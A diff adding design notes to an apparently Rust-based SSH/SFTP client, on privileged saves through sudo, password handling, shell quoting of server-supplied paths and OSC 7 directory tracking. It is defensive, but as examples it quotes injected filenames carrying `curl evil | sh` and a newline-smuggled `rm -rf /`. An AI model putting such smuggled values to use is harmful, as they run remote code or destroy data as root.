@@ -371,6 +371,73 @@ plus search/filter/accent for the parts that are live.
   moves. Polling rather than a filesystem watcher, because editors save by writing a temp file
   and renaming it over the original at least as often as they write in place, and a stat does
   not care which happened.
+- **Saving as root happens beside SFTP, not inside it.** SFTP has no notion of privilege — the
+  subsystem the server starts runs as whoever logged in, and the protocol has no way to ask for
+  more. So `sftp.rs::upload_as_root` sends the bytes up the ordinary way into a `0600` staging
+  copy in the account's own home, and `sudo.rs` runs one `cp` as root over a channel of its own.
+  `cp` onto a file that exists truncates it in place, so the target keeps its inode, owner and
+  mode; `--preserve` would stamp the staging copy's ownership onto a system file, and `mv` would
+  replace the inode. Home rather than `/tmp` because `/tmp` is shared, and a symlink planted at a
+  guessable name would have the root `cp` write through it — the `/tmp` fallback, used only where
+  there is no writable home, adds `SSH_FXF_EXCL` for exactly that, and the home path does not,
+  because a flag every elevated save depends on is not one to send where it buys nothing. Not
+  `tee` and not `sh -c 'cat > …'`, which look neater until you notice `sudo -S` has already taken
+  stdin for the password.
+- **The sudo probe asks `-v`, never `-- true`.** `sudo -n -- true` answers whether `/bin/true` is
+  permitted, which is a different question: a host with `opc ALL=(ALL) NOPASSWD: /bin/cp` says no
+  to it and yes to the `cp` that would actually run, and the feature would be hidden behind a
+  command it never uses. Worse with a password — a correct one would come back "may not run
+  sudo", sending the user after a sudoers entry that is not the problem. `-v` asks about sudo
+  itself and runs nothing.
+- **The sudo password is asked for at Edit, and never at save.** The watcher runs with nobody
+  looking — the user is in another application and has just pressed ⌘S — so a password box from
+  a background window is not something to raise there. `Open as root…` collects it while the user
+  is at the pane, `sudo -n` first so the many NOPASSWD hosts never see a box at all. A save that
+  *was* refused gets a `Save as root` button on the error line instead: the editor has already
+  written the scratch copy, so there is nothing to ask the user to do twice.
+- **That password is held in memory and nowhere else.** Not `Slot::Password` and not any other
+  keychain entry: it is a *second* secret, the account's own password on the far end, which a
+  key-authenticated host has never given us. It is dropped when the host refuses it and when the
+  session disconnects. It reaches sudo on stdin, so it is in no command string, and it never
+  touches the shell channel — `LineReader` writes every line typed there to `command_log`, which
+  is exactly what a password must not be.
+- **Every path in a sudo command is one shell word.** `exec` hands its string to the remote login
+  shell, and the paths come out of a directory listing the *server* controls. `a'; curl evil |
+  sh; '.txt` is a legal Linux filename and unquoted it is a command running as root, so
+  `sudo.rs::quoted` wraps and escapes, and the tests hold a list of the names a hostile server
+  would pick — the other half of what `scratch_name` refuses. The wrapper also runs sudo under
+  `env LC_ALL=C`: the message triage below it reads sudo's English, and `LC_ALL=C` as a bare
+  prefix is a Bourne-shell construction that csh answers with "Command not found".
+- **The two panes sync in opposite ways, because the two directions are not the same act.**
+  `cd here` types `cd '<path>'` at the shell through the same queue as a keystroke, so
+  `command_log` records it the way it records anything else typed there. `follow` does *not* ask
+  the shell where it is — there is no way to ask without typing into whatever program happens to
+  be running, which may be `vim` or a password prompt. Instead `ssh.rs::CwdReader` watches the
+  shell's own output for OSC 7, the sequence a shell uses to announce its directory. fish and
+  starship emit it already; for bash and zsh the pane offers the one line that does, to paste into
+  a profile once or to be typed at the shell for the session in hand — with the warning that
+  typing it is typing it, stated rather than buried.
+- **The announced directory lives on the `Session`, not in the task that reads it.** Only a
+  *change* is emitted, because a shell announces where it is before every prompt and a pane told
+  the same thing sixty times a minute is re-rendering to say nothing. That makes the event stream
+  alone insufficient: `SessionScreen` renders one tab, so switching away destroys the SFTP pane,
+  and a rebuilt one that could only listen would sit at "the shell has not said" until the user
+  happened to `cd` somewhere new — offering to install a hook they already have. So the last one
+  is kept on the session and `ssh_cwd` hands it to a pane that has just mounted. Replay, then
+  stream, for the same reason and in the same shape as `sshBus`.
+- **`cd` refuses a path with a line break in it.** The newline that ends the command is the one
+  character quoting cannot contain: the shell splits input into lines before it looks at a quote,
+  so a directory called `notes\nrm -rf /` — a legal Linux name, out of a listing the server
+  controls — would send two lines and the second would run. `ssh.rs::cd_line` refuses it the way
+  `scratch_name` refuses a name that is a path, rather than sanitising into a directory that is
+  not the one asked for.
+- **OSC 7 carries a URL, and the `file://` form is decoded while a bare path is not.** fish and
+  starship percent-encode, so `/tmp/my app` arrives as `/tmp/my%20app` and a parser that skips
+  the decoding opens nothing and blames the server. A hand-written hook sends the path as it is,
+  so decoding that one would break `/tmp/100%done`. Splitting on the prefix gets both right. The
+  reader is a state machine rather than a scan, because the `ESC \` terminator splits across
+  packets — the bug that reproduces weekly and never in a test that feeds whole strings, which is
+  why there is a test that feeds it cut at every offset.
 - **The 5MB edit limit is enforced in Rust, not the dialog.** The dialog is the courtesy; the
   backend check is what stops a mis-click reading a gigabyte over the wire. The frontend passes
   `confirmedLarge` only after the user has answered, so the guard cannot be reached by accident
